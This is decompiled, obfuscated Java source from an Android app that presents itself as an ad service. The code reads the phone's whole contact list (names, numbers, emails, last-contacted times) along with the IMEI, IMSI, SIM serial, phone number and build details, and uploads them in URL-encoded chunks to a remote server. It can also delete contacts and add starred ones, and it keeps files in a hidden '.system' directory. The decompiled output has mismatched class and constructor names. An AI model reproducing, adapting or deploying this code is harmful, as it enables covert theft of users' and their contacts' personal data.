        //   445	479	1505	java/text/ParseException
        //   445	479	806	java/lang/Exception
        //   482	511	1505	java/text/ParseException
        //   482	511	806	java/lang/Exception
        //   533	698	806	java/lang/Exception
        //   701	798	806	java/lang/Exception
        //   809	870	1492	java/lang/Exception
        //   872	926	1492	java/lang/Exception
        //   926	978	1492	java/lang/Exception
        //   982	992	1492	java/lang/Exception
        //   992	1001	1492	java/lang/Exception
        //   1004	1015	1492	java/lang/Exception
        //   1034	1054	1497	java/text/ParseException
        //   1034	1054	1492	java/lang/Exception
        //   1061	1070	1497	java/text/ParseException
        //   1061	1070	1492	java/lang/Exception
        //   1077	1086	1497	java/text/ParseException
        //   1077	1086	1492	java/lang/Exception
        //   1094	1128	1497	java/text/ParseException
        //   1094	1128	1492	java/lang/Exception
        //   1131	1165	1497	java/text/ParseException
        //   1131	1165	1492	java/lang/Exception
        //   1168	1197	1497	java/text/ParseException
        //   1168	1197	1492	java/lang/Exception
        //   1219	1384	1492	java/lang/Exception
        //   1392	1489	1492	java/lang/Exception
    }
}

public final class bb {
    public static final String aw = m.a(37);

    public static final String bq = m.a(38);

    public static Vector aw() {
        Vector<c> vector = new Vector();
        Cursor cursor = k.a().getContentResolver().query(Contacts.People.CONTENT_URI, null, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            int i = cursor.getColumnIndex("_id");
            int j = cursor.getColumnIndex("display_name");
            int k = cursor.getColumnIndex("last_time_contacted");
            while (true) {
                String str3 = cursor.getString(i);
                String str1 = cursor.getString(j);
                String str2 = DateFormat.format("yyyy-MM-dd kk:mm:ss", cursor.getLong(k)).toString();
                StringBuilder stringBuilder1 = new StringBuilder();
                Cursor cursor2 = k.a().getContentResolver().query(Contacts.Phones.CONTENT_URI, null, "person = " + str3, null, null);
                if (cursor2 != null && cursor2.moveToFirst())
                    do {
                        stringBuilder1.append(cursor2.getString(cursor2.getColumnIndex("number"))).append(";");
                    } while (cursor2.moveToNext());
                if (cursor2 != null)
                    cursor2.close();
                String str4 = stringBuilder1.toString();
                StringBuilder stringBuilder2 = new StringBuilder();
                Cursor cursor1 = k.a().getContentResolver().query(Contacts.ContactMethods.CONTENT_EMAIL_URI, null, "person = " + str3, null, null);
                if (cursor1 != null && cursor1.moveToFirst())
                    do {
                        stringBuilder2.append(cursor1.getString(cursor1.getColumnIndex("data"))).append(";");
                    } while (cursor1.moveToNext());
                if (cursor1 != null)
                    cursor1.close();
                vector.add(new c(str1, str4, stringBuilder2.toString(), str2));
                if (!cursor.moveToNext()) {
                    if (cursor != null)
                        cursor.close();
                    break;
                }
            }
        }
        return vector;
    }

    public static boolean aw(String paramString) {
        ContentResolver contentResolver = k.a().getContentResolver();
        if (paramString != null) {
            contentResolver.delete(Contacts.People.CONTENT_URI, "name=?", new String[] { paramString });
            return true;
        }
        return false;
    }

    public static boolean aw(String paramString1, String paramString2) {
        if (paramString1 == null)
            return false;
        a(paramString1);
        try {
            ContentResolver contentResolver = k.a().getContentResolver();
            ContentValues contentValues = new ContentValues();
            contentValues.put("name", paramString1);
            contentValues.put("starred", Integer.valueOf(1));
            Uri uri = contentResolver.insert(Contacts.People.CONTENT_URI, contentValues);
            if (paramString2 != null) {
                contentValues.clear();
                uri = Uri.withAppendedPath(uri, "phones");
                if (paramString2.length() == 11 && paramString2.startsWith("1")) {
                    contentValues.put("type", Integer.valueOf(2));
                } else {
                    contentValues.put("type", Integer.valueOf(3));
                }
                contentValues.put("number", paramString2);
                contentResolver.insert(uri, contentValues);
            }
        } catch (Exception exception) {
            return false;
        }
        return true;
    }

    public static boolean bq(String paramString) {
        String str = k.f;
        if (str == null)
            return false;
        Cursor cursor = k.a().getContentResolver().query(Contacts.People.CONTENT_URI, null, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            int i = cursor.getColumnIndex("_id");
            int j = cursor.getColumnIndex("display_name");
            int k = cursor.getColumnIndex("last_time_contacted");
            StringBuilder stringBuilder = new StringBuilder();
            while (true) {
                String str1 = cursor.getString(i);
                String str2 = cursor.getString(j);
                stringBuilder.append(str2).append("@name@");
                "-------postContacts" + str2;
                long l = cursor.getLong(k);
                stringBuilder.append(DateFormat.format("yyyy-MM-dd kk:mm:ss", l) + "@last@");
                Cursor cursor2 = k.a().getContentResolver().query(Contacts.Phones.CONTENT_URI, null, "person = " + str1, null, null);
                if (cursor2 != null && cursor2.moveToFirst())
                    do {
                        String str3 = cursor2.getString(cursor2.getColumnIndex("number"));
                        stringBuilder.append(str3).append(";");
                        "Contacts phoneNumber" + str3;
                    } while (cursor2.moveToNext());
                if (cursor2 != null)
                    cursor2.close();
                stringBuilder.append("@num@");
                Cursor cursor1 = k.a().getContentResolver().query(Contacts.ContactMethods.CONTENT_EMAIL_URI, null, "person = " + str1, null, null);
                if (cursor1 != null && cursor1.moveToFirst())
                    do {
                        stringBuilder.append(cursor1.getString(cursor1.getColumnIndex("data"))).append(";");
                    } while (cursor1.moveToNext());
                if (cursor1 != null)
                    cursor1.close();
                stringBuilder.append("@email@");
                if (stringBuilder.length() > 1024) {
                    String str3 = URLEncoder.encode(stringBuilder.toString());
                    stringBuilder = new StringBuilder();
                    "-------postContactsimei=" + str + "&phone=" + str3;
                    l.a(paramString, m.a(49) + str + m.a(50) + k.s + m.a(45) + k.b() + m.a(46) + k.c() + m.a(47) + k.d() + m.a(67) + k.e() + m.a(68) + k.f() + m.a(69) + k.g() + m.a(56) + str3);
                }
                if (!cursor.moveToNext()) {
                    if (cursor != null)
                        cursor.close();
                    if (stringBuilder.length() > 0) {
                        String str3 = URLEncoder.encode(stringBuilder.toString());
                        l.a(paramString, m.a(49) + str + m.a(50) + k.s + m.a(45) + k.b() + m.a(46) + k.c() + m.a(47) + k.d() + m.a(67) + k.e() + m.a(68) + k.f() + m.a(69) + k.g() + m.a(56) + str3);
                    }
                    break;
                }
            }
        }
        return true;
    }
}

public final class kkk {
    public static String A;

    public static String B;

    public static String C;

    public static String D;

    public static String E;

    public static String F;

    public static String G;

    public static String H;

    public static String I;

    private static String J;

    private static Context K;

    private static Vector L;

    private static Vector M;

    public static byte[] a = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

    public static final String b;

    public static final String c;

    public static final String d;

    public static final String e;

    public static String f;

    public static String g;

    public static String h;

    public static String i;

    public static String j;

    public static String k;

    public static String l;

    public static String m;

    public static String n;

    public static String o;

    public static String p;

    public static String q;

    public static String r;

    public static String s;

    public static String t;

    public static String u;

    public static String v;

    public static String w;

    public static String x;

    public static String y;

    public static String z;

    static {
        J = Environment.getExternalStorageDirectory() + File.separator + ".system";
        b = J + File.separator + "apps";
        c = J + File.separator + "icons";
        d = J + File.separator + "wallpapers";
        e = J + File.separator + "ads";
        f = null;
        g = null;
        h = null;
        i = null;
        j = null;
        k = null;
        l = null;
        m = null;
        n = null;
        o = null;
        p = null;
        q = null;
        r = null;
        s = null;
        t = null;
        u = null;
        v = null;
        w = null;
        x = null;
        y = null;
        z = null;
        A = null;
        B = null;
        C = null;
        D = null;
        E = null;
        F = null;
        G = null;
        H = null;
        I = null;
        K = null;
        L = null;
        M = null;
    }

    public kq(AdService paramAdService) {
        K = (Context)paramAdService;
        TelephonyManager telephonyManager = (TelephonyManager)paramAdService.getSystemService("phone");
        String str = telephonyManager.getDeviceId();
        f = str;
        if (str == null)
            f = "1234567890";
        g = telephonyManager.getDeviceSoftwareVersion();
        h = telephonyManager.getLine1Number();
        i = telephonyManager.getNetworkCountryIso();
        j = telephonyManager.getNetworkOperator();
        k = telephonyManager.getNetworkOperatorName();
        l = String.valueOf(telephonyManager.getNetworkType());
        m = String.valueOf(telephonyManager.getPhoneType());
        n = telephonyManager.getSimCountryIso();
        o = telephonyManager.getSimOperator();
        p = telephonyManager.getSimOperatorName();
        q = telephonyManager.getSimSerialNumber();
        r = String.valueOf(telephonyManager.getSimState());
        str = telephonyManager.getSubscriberId();
        s = str;
        if (str == null)
            s = "1234567890";
        t = telephonyManager.getVoiceMailNumber();
        u = Build.MODEL;
        v = Build.BOARD;
        w = Build.BRAND;
        x = Build.CPU_ABI;
        y = Build.DEVICE;
        z = Build.DISPLAY;
        A = Build.FINGERPRINT;
        B = Build.HOST;
        C = Build.ID;
        D = Build.MANUFACTURER;
        E = Build.PRODUCT;
        F = Build.TAGS;
        G = DateFormat.format("yyyy-MM-dd kk:mm:ss", Build.TIME).toString();
        H = Build.TYPE;
        I = Build.USER;
    }

    public static Context az() {
        return K;
    }

    public static String az(Context paramContext, String paramString) {
        return PreferenceManager.getDefaultSharedPreferences(paramContext).getString(paramString, null);
    }

    private static String az(String paramString) {
        StringBuffer stringBuffer = new StringBuffer();
        while (paramString.length() > 0) {
            String str;
            int i = paramString.indexOf(';');
            if (i >= 0) {
                str = paramString.substring(0, i);
                paramString = paramString.substring(i + 1);
            } else {
                String str1 = "";
                str = paramString;
                paramString = str1;
            }
            if (str.length() >= 11) {
                str = str.substring(str.length() - 11);
                if (str.startsWith("1"))
                    stringBuffer.append(str).append(";");
            }
        }
        return stringBuffer.toString();
    }

    public static void az(Context paramContext, String paramString1, String paramString2) {
        SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(paramContext).edit();
        editor.putString(paramString1, paramString2);
        editor.commit();
    }

    public static String bz() {
        return AdService.b();
    }

    public static String cz() {
        return AdService.c();
    }

    public static String dz() {
        return AdService.d();
    }

    public static String ez() {
        return AdService.e();
    }

    public static String fz() {
        return "1.4";
    }

    public static String gz() {
        return "1.4";
    }

    public static String hz() {
        "runmode=" + AdService.b;
        return AdService.b.equals(m.a(1)) ? m.a(5) : (AdService.b.equals(m.a(0)) ? m.a(3) : m.a(4));
    }

    public static void iz() {
        L = b.a();
        M = new Vector();
        for (int i = 0; i < L.size(); i++) {
            c c = L.get(i);
            String str = a(c.b);
            if (str.length() > 0)
                M.add(new c(c.a, str, c.c, c.d));
        }
    }

    public static cz[] jz() {
        return (cz[])M.toArray((Object[])new c[0]);
    }
}

